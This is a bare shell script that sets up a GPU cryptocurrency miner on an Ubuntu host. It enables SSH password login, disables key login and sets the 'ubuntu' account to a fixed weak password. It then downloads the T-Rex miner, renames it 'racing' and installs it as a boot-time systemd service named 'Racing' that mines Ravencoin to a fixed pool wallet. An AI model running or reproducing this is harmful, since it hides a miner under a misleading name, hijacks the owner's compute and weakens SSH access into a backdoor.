sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
echo "ubuntu:blabla123" | sudo chpasswd
sudo service ssh restart
cd /home
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
sudo apt-get update
sudo add-apt-repository --yes ppa:graphics-drivers/ppa
sudo apt-get -y install cuda-drivers-510
sudo apt-get install libcurl3 -y
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
sudo tar xvzf t-rex-0.21.6-linux.tar.gz
sudo mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abcd -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abcd -p x &
